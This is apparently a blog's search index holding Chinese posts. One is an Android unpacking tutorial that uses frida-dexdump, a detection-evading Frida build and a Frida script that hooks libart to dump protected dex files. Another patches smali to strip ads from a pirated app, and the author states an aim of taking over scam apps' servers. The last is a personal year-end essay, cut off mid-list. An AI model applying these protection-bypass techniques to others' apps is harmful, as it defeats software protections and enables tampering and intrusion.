<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>脱壳入门</title>
    <link href="/2025/02/05/%E8%84%B1%E5%A3%B3%E5%85%A5%E9%97%A8/"/>
    <url>/2025/02/05/%E8%84%B1%E5%A3%B3%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>hook ， 抓包，调试和反调试等安卓逆向基础知识都学了，刚准备成就一番事业，出门遇到大boss 360加固，要么就是梆梆加固企业版，打开app就是网络错误，或闪退或连不上网，源码是看不到的，frida一启动就是process terminated，根本无从下手，深感无力，感觉还是功力尚浅，故欲深究加壳和脱壳。</p><h1 id="简要原理和过程"><a href="#简要原理和过程" class="headerlink" title="简要原理和过程"></a>简要原理和过程</h1><p>主流是写一个代理Application，加载so文件，so里面写dex文件的解密逻辑，再用DexClassLoader加载解密后的dex文件。</p><p>要懂一点双亲委派机制，Dex文件结构等知识，具体就不多写了，可以见：[<a href="https://bbs.kanxue.com/thread-273293.htm">原创]Android漏洞之战（11）——整体加壳原理和脱壳技巧详解-Android安全-看雪-安全社区|安全招聘|kanxue.com</a> 以及这篇文章里的提到的其他链接</p><p>例如梆梆加固免费版，这里我用的apk是吾爱破解论坛安卓逆向这档事的demo，梆梆加固注册个账号，把apk传上去加固下再下下来就行，jadx打开</p><p><img src="/../unpack_play/image-20250205174421050.png" alt="image-20250205174421050"></p><p><img src="/../unpack_play/image-20250205174436101.png" alt="image-20250205174436101"></p><p>尝试IDA打开，函数名基本都是没啥规律的，点开也是JUMP_OUT(地址)，要么是一堆LABEL混淆过的，看不明白。</p><p>咋办呢，那就从内存里下手呗。例如frida-dexdump。</p><p>原理是这样的，&#x2F;proc&#x2F;&lt;pid&gt;&#x2F;maps放了这个进程分配的所有内存块索引，然后在这些内存块里寻找dex文件特征的部分，如果能匹配到就dump到文件里。</p><p>梆梆加固免费版会有frida的检测，可以用frida魔改版server：<a href="https://github.com/Ylarod/Florida/releases/tag/16.6.6">Release 16.6.6 · Ylarod&#x2F;Florida</a></p><p>大致的魔改原理可以见：<a href="https://www.52pojie.cn/thread-1921073-1-1.html">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上) - 吾爱破解 - 52pojie.cn</a></p><p>究其根源还是要看frida的源码，看看可能会有什么特征。如果未来遇到魔改server也不起作用的话，还要深入研究一下这块。</p><p><code>frida-dexdump -U -f com.zj.wuaipojie</code></p><p>拿到20个dex文件，jadx打开：</p><p><img src="/../unpack_play/image-20250205175652330.png" alt="image-20250205175652330"></p><p>可以看到成功脱壳。</p><h1 id="frida-dexdump脚本原理"><a href="#frida-dexdump脚本原理" class="headerlink" title="frida-dexdump脚本原理"></a>frida-dexdump脚本原理</h1><p><a href="https://github.com/hluwa/frida-dexdump/blob/master/agent/src/index.ts">frida-dexdump&#x2F;agent&#x2F;src&#x2F;index.ts at master · hluwa&#x2F;frida-dexdump</a></p><p>这里只写关键函数，主要看searchDex，分为普通搜索和深度搜索，先看普通的：</p><p><img src="/../unpack_play/image-20250205181410649.png" alt="image-20250205181410649"></p><p>先检查文件头特征”64 65 78 0a 30….”，假如有的话，先检测路径是否为&#x2F;data&#x2F;dalvik-cache或&#x2F;system,如果是的话直接return（系统的dex），然后调用verify函数验证。</p><p><img src="/../unpack_play/image-20250205181718691.png" alt="image-20250205181718691"></p><p>先看0x70是否比这块内存大（0x70是dex文件头大小，如果都没这个大，那这块肯定不是dex文件），然后根据maps来判断，关键在verify_by_maps方法。</p><p><img src="/../unpack_play/image-20250205182030276.png" alt="image-20250205182030276"></p><p><code>0x34</code> 是 <strong>DEX 文件头（Dex Header）中的 <code>map_off</code> 偏移量</strong>，用于获取 <code>map_list</code> 的地址，然后遍历。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DexMapList</span> &#123;<br>    <span class="hljs-type">uint32_t</span>  size;   <span class="hljs-comment">// 记录 `DexMapItem` 的数量</span><br>    DexMapItem list[size]; <span class="hljs-comment">// MapItem 列表</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DexMapItem</span> &#123;<br>    <span class="hljs-type">uint16_t</span> type;    <span class="hljs-comment">// **数据类型**（4096 表示 `TYPE_MAP_LIST`）</span><br>    <span class="hljs-type">uint16_t</span> unused;<br>    <span class="hljs-type">uint32_t</span> size;    <span class="hljs-comment">// 该数据项的数量</span><br>    <span class="hljs-type">uint32_t</span> offset;  <span class="hljs-comment">// 该数据项的偏移量</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>遍历的是DexMapItem结构，每个大小为0xC，然后判断类型是否为”TYPE_MAP_LIST”。也就是item_type &#x3D;&#x3D;&#x3D; 4096这一行。这个类型里的offset表示map_list本身的偏移地址。</p><p>所以把之前获取的和TYPE_MAP_LIST里的对比下就能判断是否为完整DEX文件了。</p><p><img src="/../unpack_play/image-20250205184720794.png" alt="image-20250205184720794"></p><p>deepsearch部分，检测70 00 00 00</p><p>在 DEX 文件头（Header）中，**偏移 <code>0x0C</code> 处存储了 <code>header_size</code>**，它表示 <strong>DEX 头部的大小</strong>，永远是0x70 (112)</p><p>并且还考虑了magic字段被抹去的情况<code>dex_base.readCString(4) != &quot;dex\n&quot;</code>，还多了一个verify_ids_off</p><p><img src="/../unpack_play/image-20250205184807830.png" alt="image-20250205184807830"></p><p>这里是dex文件里各种重要字段的偏移，要比dex文件本身小，比文件头大(0x70)</p><p>剩下的就不写了。</p><h1 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h1><p>假如打乱了内存里dex文件的内容，这该怎么办？frida-dexdump肯定就没辙了。在App的启动流程里，DexFile数据结构是一个重要的角色，不管怎么加密解密，随便折腾，最后都要经过这个数据结构。所以hook dexfile相关的函数，也可以实现脱壳。</p><p>ida打开libart.so,看雪里的文章中挑选的是这个函数。</p><p><img src="/../unpack_play/image-20250205194643722.png" alt="image-20250205194643722"></p><p>第一个参数就是Dexfile，ida应该是自动处理了？得找到原来的名字。</p><p><img src="/../unpack_play/image-20250205194903640.png" alt="image-20250205194903640"></p><p>鼠标放上面，按X查看引用下，然后copy出来即可。</p><p>frida脚本：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> libartModule = Process.getModuleByName(<span class="hljs-string">&quot;libart.so&quot;</span>);  <span class="hljs-comment">// 获取 libart.so 模块</span><br>    <span class="hljs-keyword">var</span> hookName = <span class="hljs-string">&quot;_ZN3art11ClassLinker10SetupClassERKNS_7DexFileERKNS_3dex8ClassDefENS_6HandleINS_6mirror5ClassEEENS_6ObjPtrINS9_11ClassLoaderEEE&quot;</span>;  <span class="hljs-comment">// 要查找的函数名</span><br><br>    <span class="hljs-comment">// 遍历模块的符号（包括导出的函数和变量）</span><br>    <span class="hljs-keyword">var</span> addr = libartModule.getExportByName(hookName)<br>    <span class="hljs-keyword">if</span>(addr != <span class="hljs-literal">null</span>) &#123;<br>        Interceptor.attach(addr, &#123;<br>            <span class="hljs-attribute">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;<br>                <span class="hljs-keyword">var</span> dexFileAddr = args[<span class="hljs-number">1</span>]<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;dexFileAddr:&quot;</span> + dexFileAddr)<br>                <span class="hljs-keyword">var</span> begin = ptr(dexFileAddr).add(Process.pointerSize).readPointer()<br>                <span class="hljs-keyword">var</span> <span class="hljs-built_in">size</span> = ptr(dexFileAddr).add(Process.pointerSize * <span class="hljs-number">2</span>).readU32()<br>                save(begin, <span class="hljs-built_in">size</span>)<br>            &#125;<br>        &#125;)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">begin, size</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> path = <span class="hljs-string">&#x27;/storage/emulated/0/Download/&#x27;</span>+<span class="hljs-built_in">size</span>+<span class="hljs-string">&#x27;.dex&#x27;</span><br>    <span class="hljs-keyword">var</span> file = <span class="hljs-keyword">new</span> File(path, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    file.write(ptr(begin).readByteArray(<span class="hljs-built_in">size</span>))<br>    file.flush()<br>    file.close()<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;dump success!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br>    hook()<br>&#125;<br><br>setImmediate(main)<br><br></code></pre></td></tr></table></figure><p><code>frida -f -U com.zj.wuaipojie -l unpack.js</code></p><p>运行成功后pull出来</p><p><img src="/../unpack_play/image-20250205195144404.png" alt="image-20250205195144404"></p><p>成功拿到源码！</p><p><img src="/../unpack_play/image-20250205195218166.png" alt="image-20250205195218166"></p><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>假如，假如说，直接重写DexFile的加载，这该怎么办？也看了一些其他文章，说目前最新的技术是啥vmp保护。总之要走的路还很长，慢慢学吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>androidReverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android-reverse-去广告实战</title>
    <link href="/2025/01/03/android-reverse-%E5%8E%BB%E5%B9%BF%E5%91%8A/"/>
    <url>/2025/01/03/android-reverse-%E5%8E%BB%E5%B9%BF%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<p>新年新气象，年末就有思考，不太想局限于web了，学点新东西吧。正好对安卓逆向一直都有点兴趣，立一个学成的小目标，可以破解某境外诈骗软件&#x2F;色情直播软件并拿下对方服务器后台&#x2F;shell，回归最初学习安全的初心（还是搞破坏有意思）。</p><p>教程看的 <a href="https://www.bilibili.com/video/BV1zk4y137Bn%EF%BC%8C%E6%84%9F%E8%A7%89%E8%B4%A8%E9%87%8F%E5%BE%88%E5%A5%BD%E3%80%82">https://www.bilibili.com/video/BV1zk4y137Bn，感觉质量很好。</a></p><p>网上随便找一个app，紫色视频。但是这玩意貌似有很多版本，比如我下的包名有麻豆视频：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103195625557.png" alt="image-20250103195625557"></p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>打开MT管理器，打开Activity记录。</p><p>打开后要观看广告，记录如下：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103200453438.png" alt="image-20250103200453438"></p><p>最后一共看了两次广告。</p><p>可以看到用了百度的SDK，去MainActivity看看。jadx打开apk：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103200608045.png" alt="image-20250103200608045"></p><p>LoadAdBaiduBidding封装了调用百度SDK的逻辑，没啥看的。这个函数是void类型，可以直接在开头添加return-void。或者在onCreate方法里把那行注释掉即可。</p><p>这里为了方便选第一种。</p><p><img src="/../AndroidReverseRemoveAD/image-20250103200841823.png" alt="image-20250103200841823"></p><p>打开SplashActivity看看：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103200858642.png" alt="image-20250103200858642"></p><p>显然也调用了，这符合之前的看了两次广告的效果，</p><p>NP管理器提取安装包，Dex编辑class文件：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201049170.png" alt="image-20250103201049170"></p><p>全局搜索下刚刚提到的，修改好后，保存后，再复制方法签名一下</p><p>打开算法助手，选中紫电视频：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201203636.png" alt="image-20250103201203636"></p><p>点开后拉到最下面，添加自定义Hook，由于刚刚复制了方法签名，按确定即可，然后启动自定义hook。</p><p>重启紫电视频，发现广告消失了，点进去一看，怪不得包名里有麻豆。。。</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201330869.png" alt="image-20250103201330869"></p><p>明显这是个盗版紫电视频，逆天的还不在此。</p><p>随便点击任何按钮，都会跳出这个页面：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201436180.png" alt="image-20250103201436180"></p><p>每次解锁都要看广告，由于我们hook掉了广告，点击提示暂时没有广告。</p><p>在jadx里搜一下“暂时没有广告”：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201619618.png" alt="image-20250103201619618"></p><p>这个方法是showAd方法，按x看被谁调用了：</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201715642.png" alt="image-20250103201715642"></p><p>这里有个判断，根据MainFragment.this.count的值设置button。我在hook之前测试了，点击那个立即解锁按钮，一共还要看三次广告才可以解锁，这就对应上了之前的逻辑。</p><p><img src="/../AndroidReverseRemoveAD/image-20250103201857952.png" alt="image-20250103201857952"></p><p>继续往上跟，发现这里count有判断，不为0就会到showReward。</p><p>再往上跟发现他给所有按钮都设置了一个AdListener，然后每次点击必然会走到这里。</p><p>所以此处修改this.count始终为0即可。</p><p>打开np管理器，打开安装包，定位到对应的smali代码行，在函数开头添加：</p><p>const&#x2F;4 p1, 0</p><p>iput p1, p0, Lcom&#x2F;hb&#x2F;madouvideo&#x2F;MainFragment;-&gt;count:I</p><p>重新hook后打开，点击立即解锁。</p><p><img src="/../AndroidReverseRemoveAD/image-20250103203142215.png" alt="image-20250103203142215"></p><p>然后最终来到这个页面，what？我卸载后重装了原来没改过的，老老实实看了10分钟广告，最后也是来到这个页面，说明这个几把软件啥功能都没实现，就是让你看广告，然后来到另一个app的下载。。。</p><p>而且以后每次打开这个软件，都只有这个页面了。如果点取消，就会直接白屏。我也是难绷了。</p><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>用XappDebug结合jadx动态调试会和算法助手发生冲突，在jadx debug的时候，算法助手hook的内容会消失，并且貌似重启了手机才会变正常。</p><p>MT管理器的Activity服务不要一直开着，跟完就关掉，否则在安装新包的时候，或者即使关掉了算法hook，导致修改无效。（反正就是有问题，重启了就好了，而且必须是在MT管理器Activity服务关闭的时候重启）</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>平平无奇的安卓实战，由萌新跃迁了一级成为菜鸡，而且这个app连签名校验都没。未来还需多多学习。</p>]]></content>
    
    
    
    <tags>
      
      <tag>android reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年终总结</title>
    <link href="/2024/12/30/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2024/12/30/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>今年学到了非常多的东西，相比之下，技术上的进步反而显得微不足道，对于心灵方面的思考才是最重要的。受益于终生。<br>所以我把技术的进步放在了后面，前面写一些其他的。</p><p>本篇文章大量充斥个人观点，不适用所有人，且必然有谬误，纯当参考。</p><p>想到啥就写啥，会很乱，也是随便写。如果您看了觉得有收获，那就再好不过了。</p><h1 id="傻逼论"><a href="#傻逼论" class="headerlink" title="傻逼论"></a>傻逼论</h1><p>人生是一个不断发现自己是傻逼的过程，判断自己是否成长的方式，是看自己是否频繁认为自己是傻逼。频率越高，成长越快。<br>譬如我看我去年写的年终总结，就在看一个傻逼。</p><p>分为被动发现自己傻逼，主动寻找傻逼之处和不承认是傻逼。<br>不承认是傻逼必然会导致心理疾病，呈现出巨婴的表现，此类人群是真傻逼，生活中要极度远离。<br>被动发现自己傻逼，是正常人的常态，一般以年为单位，比如初中了发现小学发的QQ空间很弱智。<br>主动寻找傻逼之处是略少数人会做的事，这意味着要克服人回避痛苦的天性。<br>在中学时代，发现自己是傻逼，是以一年一次为单位的，在大一，大二初的时候，是以半年为单位的，而在今年看了很多书后，是以月为单位的。</p><p>发现自己是傻逼是很有意义的一件事，如果说某一年内没有找到自己的傻逼事，说明今年在个人成长方面毫无进步，值得警惕。</p><p>发现自己是傻逼并不意味着批判和自责，这样只会陷入内耗的恶循环。知道傻逼论的含义后，发现自己是傻逼就是一件高兴的事了。是渴望自己不再傻逼的心理，并非苛责了。</p><h1 id="看书"><a href="#看书" class="headerlink" title="看书"></a>看书</h1><p>我过去总对看书有一种偏见，小学中学时期学校让读的书，都是一些故事性的书，文学类的书，一没兴趣，二是认识局限，看了也看不出什么东西。有这个时间，我咋不去打游戏？<br>且我总是想自己原创性的思考一些结论，同时，潜意识总觉得，看一本书，就必须有相应的收获——正反馈必须给足了，否则不太想去看。这本质上就是一种幻想，阻碍了个人成长。就如学习安全领域，没人会一直带你，真正的大佬都是自学，没人会追着喂给你知识。而在自学的过程中就会有大量试错。</p><p>市面上有大量的垃圾书，什么速成xxx，xxx教你xxx，xx心理学，这类基本都是垃圾。其次是文学性强的书，政治正确的书，我觉得很没意思，而中学时代的必读书目有很多这些书，这也导致了我过往的偏见，我非常不爱看这些。</p><p>再有是讲故事类型的书，很可惜我也没怎么看过，如果未来有时间可以读一读。</p><p>最后就是各种学科领域的书，这些才是人类智慧的精华，可以说，在今年读这些书直接改变了我的思维方式，间接的，未来必然会影响我的人生。</p><p>一本好书凝聚了作者一生的思考精华，在看的过程中，我发现我日常所做的思考，会与作者的观点重合，大部分情况下，作者的表述更全面，更准确。世界上你从未遇见过的，毫不相干的一群人可以和你想到一块去，他们甚至有些死了几百年了。每次读到这些章节，都会感觉奇妙无比。</p><p>如果读了很多书，发现没有任何变化，此时读书和刷抖音，看视频一样，成了不断强化自己局限认知的手段，或者只是单纯的用来娱乐。就譬如我在中学时代看一些名著，基本也是讲故事类型的，由于认知太局限，看也看不太懂，但是挑中了其中讲的一些观点，就在现实胡乱套用，实际上根本不适用。根本没有经过严密的思考和痛苦的反省。这样读书等于浪费时间，确实不如玩两把游戏带来的快乐实在。</p><p>水浒传算是我唯一看过的四大名著了，仔细想想当初到底看出了个什么滋味呢？没有。现在回忆一些所谓梁山好汉，简直就像是一群暴徒，死有余辜的东西。对于当时年幼的我来说，自然而然认为书里的主人公就应当是正义的，但总觉得别扭，事实上是这本书更多是在写一些现实的黑暗，关于社会的悲剧。<br>想了想当时考试中的内容，也是赞扬颇多，专门挑好的说，真实的情况也刻意忽略。所以我总有种被愚弄之感，被当成蠢货糊弄的感觉，不得不引申出我对上学的思考。</p><h1 id="关于上学"><a href="#关于上学" class="headerlink" title="关于上学"></a>关于上学</h1><p>在暑假时候去北京实习了，遇到了一件印象深刻的事。<br>租房的中介是一个比我大两岁的小哥，他初中没上完，来北京当销售了。<br>当时带我看房子，开的是宝马，车载音响放着自己的歌，吹着空调来到了住的地方，最后收钱直接收了我一个月的房租价格的中介费——两千一百。<br>他说这是他今天的第四单，此时正值下午两三点，可以想到，后面还会有几单。也就是说，他今天一天就可以挣上万。<br>我问了他的生意，他说6789月，毕业季高峰期，这几个月老赚了。</p><p>如果这样推算，想来这个宝马应该也是他的，估计也几十万了，也就比我大两岁而已，但已经积累相对可观的财富了，我不得不去思考，上学的意义是什么？<br>我又回忆起了我初中时期的一个同学，这位同学基本也不学习，每天就是玩，最后这位同学自然也没考上高中，只记得当时我升入高中后，听闻他去北京做销售，第一个月就挣了一万多。</p><p>当然，这些人可以挣这么多，是因为他们口才很好，性格很外向，会说话。但我总是会想起这件事，不由得感慨：我上这么多年学的意义在哪？</p><p>后来我明白了：上学是对自身的投资，而且是保守的投资，是一种相对来说，低风险，低回报的投资。就如同股票和债券的区别。</p><p>可以不上学，前提是你懂自己要做什么，极其牛逼的人，他们甚至不需要读大学（比如乔布斯，比尔盖茨），因为他们知道上大学，对自己是负收益，会降低自己的上限。</p><p>经此一事彻底打消了我读研的念头，读研读博，把人生最宝贵，最有精神的青年时代放在这方面，很明显，极大的提高了下限，但相应的，也降低了自己的上限。做的是低风险，低收益的投资。<br>竞争环境如此激烈，还能考上不错的学校的，或保研的，那一定很厉害了，我要是有这么够的专注力和精力，为什么不去社会折腾呢？<br>我并没有学术理想，做研究也不是我所热爱的事，而且我也没有深造的想法（我更想在工作中深化我的技能），所以我断然不会再去做提学历这件事。</p><p>我们从小就被灌输了观点——要读圣贤书。这句话本来就充满了极大的疑问：什么是圣贤书？怎么定义的？上学就是读圣贤书吗？</p><p>很显然，上学和读书不是必然关系，学校里教的是最基础的知识，玩的是智力竞赛，但如逻辑学（思考逻辑），心理学（调整自身生活，认识自己），经济学（理解世界的运转），政治学等等等等，真正有益的知识，会教你吗？也会教，但也很浅，不作考核。或者，把知识阉割掉，再教给你，还分辨不出来对错了。</p><p>试问所谓的大学课程，水课有多少？课不水，老师水平低的有多少？老师水平高，又愿意好好教学的有多少？<br>所谓公选课，选修课，学生们真正感兴趣的有多少？选到了感兴趣的，为了迎合学生考试，分数，教的又是浅之又浅，严肃性甚低，一学期所教内容甚至不如看本书来得快。<br>所谓的大学比赛，ppt，演讲，论文，一套接一套，含金量在哪里？一个人卷，大家都得跟着被迫卷，请问这种加分制度有必要么？跟个好爹导师，使用学长历年传承项目，某些人甚至代码都不改几行，官方文档都读不懂，靠精美的ppt省奖国奖拿到手软，这种比赛很有必要么？<br>我虽没搞过学术，但在知乎看，或听朋友说，国内学术造假，伪造数据之流是有一定数目的，那些真正想做研究，但天资并不太聪颖的人，是否就这样被挤下去了呢？</p><p>水课水老师出来水学生，研究生博士尚且如此，本科更不必说了，这难道就是教育公平么？如此过度追求所谓公平，请问效率哪去了？这就是我们学生想要的么？</p><p>上了这么多年学，还是要自学占的多，试问那些牛逼的学生，哪个是乖乖地跟着学校学的呢？</p><p>从社会的角度看，这又是一个全国范围内的囚徒困境，每个人都为了追求更好的未来的可能性，拼命地挤独木桥，从而让应试蔓延到了大学。而那些真正想做研究的，对科研有热衷和兴趣的人呢？恐怕有不少被筛掉了吧。面对这样的囚徒困境，发展成如今这样是必然的。事实上是全世界范围内都如此，只是严重程度不同罢了。</p><p>另一件很显然的事，上学不指望老师来指点（特别指未来人生的道路选择）。且不说人生不可能直接吸收他人的二手知识，大部分学生我想最终还是进入社会的，有些老师在象牙塔内混学术圈，或者行政混的很好，不过是早生几十年，命好而已，提前占了坑位罢了，放到现在能有这样？<br>某些所谓的教授，写的教材晦涩难懂，感觉纯纯像是刷头衔刷荣誉写的玩意，还他妈给学生看，那么简单的东西拐来拐去一堆定义，说都说不明白，写你妈呢？随便到youtube找个国外课程讲的都比那些废话清楚100倍。</p><p>换句话说，老师的主要利益是科研，而非教学，是写出教材拿头衔，而非让你看懂。本质上，是学生和老师的利益不在一块。</p><p>所以，借用盛京剑客（某网络博主）的话：“中国的教育本质上是智商的逆向筛选教育，谁信谁就输了。最聪明的，会装作信，忽悠别人，最傻的，要真心为万世开太平了，为集体奉献一切了。最后混的最好的往往是学霸和学渣，为什么啊？因为他们都不信啊！”</p><p>推而广之，说是教育，不如说是考试筛选，中考高考，公务员考，研究生考，CTF比赛也可看做智力竞赛的考，貌似中国人的前半生就活在考内了。考完便是996，再来点职场勾心斗角，再卷考核成绩，这还不论结婚生子，奉献个几十年，这么活着有什么意思呢？<br>诚然，考试是一种快速高效的筛选手段，但如此内卷，对于被筛选者已然成了极大负担，如果我的前半生活在考里，中半生活在卷里，后半生活在病里，这么赖活着有意思吗？</p><p>回想中学6年，除去同学老师朝夕相处的真情外，剩下的不由得感觉是占据了自己人生的垃圾时间，但若无这些垃圾时间，也必然催生不出我此刻的想法。正所谓先吃过屎再说屎难吃，也没人告诉我怎么才能再也不吃屎，只能靠自己悟得了，只希望未来可以多拥有属于自己的时间，哪怕随意挥霍浪费，也是心情舒畅的，而不是持续吃屎了。</p><p><img src="/../zookeeper-authentication-bypass/image-20241230212433046.png" alt="image-20241230212433046"></p><h1 id="关于评价体系"><a href="#关于评价体系" class="headerlink" title="关于评价体系"></a>关于评价体系</h1><p>今年悟到的最重要的道理就是，有自己的评价体系。我在之前的文章里多次写到，但我还想写一些。</p><p>前提是需要思考，而且必须是尊重现实的思考。一个反例就是阿Q。很明显，阿Q是活在自己精神世界的人，他确实建立了自己的评价体系，但没有尊重现实。活在自己的想象里。</p><p>这样的评价体系，就成了用于逃避现实的工具，久而久之必然会导致心理疾病。</p><p>为什么说真正的思考是痛苦的？真正的思考要尊重现实，而尊重现实最难的一点在于直击自己的自恋——这是很多人无法忍受的。<br>荣格说， 一个人毕其一生的努力就是在整合他自童年时代起就已形成的性格。这其中最难的部分，就是直面自己的内心的阴影。阴影的形成，又和童年时代起的经历息息相关。</p><p>在我个人看来，相当多的人活的痛苦，活的焦虑，难以尊重现实，并非单纯是自己悟性不够，智商太低，另一个因素是其内心的阴影过于巨大，难以面对和接纳。<br>有些人接纳和整合自己犹如搬一块石头，费点力气就能做到，有些人则像是愚公移山一样，长年累月都难以彻底改变。</p><p>除了吃不饱穿不暖，生大病这种物理上的疼痛，一切的焦虑，紧张，痛苦都是来自于心灵上的，而心灵上的痛苦来自于你的观念，观念的塑造来自于社会公认的评价体系。比如说，突然发现过去的老同学，身边的同龄人很优秀，重的便感觉痛苦窒息了，轻的就感觉焦虑紧张了；比如停下来一段时间后，就觉得焦虑不安，难以安心休息，仿佛非得做些什么事情才能够心安；比如说，想到父母了，就觉得不应该让父母失望，要满足他们的期待了。然而期待是怎样的呢？是希望儿女有出息，为了自己的面子而期待呢？还是希望儿女身体健康，幸福美满而期待呢？还是杂合在一起的呢？不得而知了，总之就要努力为别人而活了；比如说，看到周围人都结婚生子，买房买车了，就感到落后他人了；于是，我就要穷追不舍了，拼命去努力了。说是要为自己而活，本质上还是为别人而活，活在别人的眼光里。</p><p>道理很易懂，但确实难以做到，我想其中必然有更深层次的原因。</p><p>中国目前是太平盛世，绝大部分人可以吃饱穿暖，有钱看病，保障自身安全，说实话，说这是最好的时代也不为过。至于怎么活，全看自己。</p><h1 id="文科和理科"><a href="#文科和理科" class="headerlink" title="文科和理科"></a>文科和理科</h1><p>我在中学时代总有种偏见，理科是至高无上的，改变世界的，文科是没用的，死记硬背的。即使不是，也是八股文一样，要迎合出题人的思路来答题（某种程度上来说确实如此，学生想要写自己与众不同的想法不太可能）。<br>智商是最重要的，一个高智商的人，必定是令人羡慕的，高智商且学习好的人，那以后大概率也是成功的人。<br>我们应该在什么年纪就做什么样的事，什么时候就该做什么。<br>认为科学能够改变世界，什么事，都可以用科学研究。</p><p>这些都是学生思维，如果符合这些观念，在应试教育的丛林法则下，可以过的很好。在上了大学后，我发现这些都是狗屎，严重阻碍我的进步。</p><p>大学期间，我发现我反而愿意主动学习文科，社科方面的内容。对世界而言，理科工科是推动科技进步，生产力发展的基石。对个人而言，文科社科类方面的知识和思考更重要一些。换句话说，技术什么时候都可以学，认知的增长则不是了。</p><h1 id="攻击性分析"><a href="#攻击性分析" class="headerlink" title="攻击性分析"></a>攻击性分析</h1><p>写了这么多发现，我今年一个很大的变化在于释放了攻击性，比如上述行文中，相对于去年年终总结的唯唯诺诺，言语措辞激烈的就很多了，这和我之前是完全不同的。事实上我在过去的生活中，扮演的角色偏向于老好人。尤其是在熟悉的人面前，不对任何人释放攻击性，且过度为他人着想。</p><p>所以从精神分析的角度看这个是什么呢？仍然是一种自恋的表现，压抑自己的攻击性去扮演一个老好人形象，这其实携带着一个信号：”我的话是重要的，会伤到别人的。我是特别的“。</p><p>这其实和过度自卑的人是一个道理，一些人在出了不好的事后，总喜欢把错误归结到自己身上，比如张三和李四同学间闹矛盾，事后和好后，张三总是在责怪自己，认为发生矛盾的原因都是自己造成的，和李四没有一点关系或者很少。这个想法就携带着一个信号：”我是特别的，我的影响是最重要的“。这本质上也是过度自恋的表现，与完全不认为自己有问题的人一样，都是自恋的一体两面。只不过从结果来看，一个是摧毁自己，另一个是摧毁他人。</p><p>另外，释放攻击性往往携带着愤怒，而愤怒这种情绪代表着什么呢？愤怒是为了保护自己而产生的。比如人在极度恐惧的情况下，就会催生出愤怒，愤怒是用来保护自己的。比如有些巨婴听不得半点坏话，甚至于不同于自己观念的，此时产生的愤怒就是为了保护巨婴的全能自恋。比如恋爱方的女性常常愤怒，因为女性往往在弱势方而无安全感，就要发生愤怒来保护自己了。</p><p>为什么一些人基本不愤怒？因为其内核稳定。换而言之，他们不会臆想某个人要对自己产生恶意了，也不会因为一些垃圾事觉得自己受到侵害了。这是内心强大的表现，也是全能自恋程度低的表现。能做到极致的，古往今来者，都是圣人了。<br>但也并非完全不愤怒，彻底压抑则会变成”老好人“，麻木的人，像傀儡一样的人。而是合理释放攻击性。</p><p>所以，情绪不稳定的，爱发脾气的人，本质上都是脆弱的人。区别在于他们把攻击性释放到外面。另一类人是“老好人”的倾向，比如像我这样的，不敢于释放攻击性，喜欢将错误过度归因于自己的。本质上，这些都是巨婴的表现。那么什么是巨婴呢？</p><ol><li>我是神，世界的一切运行都要按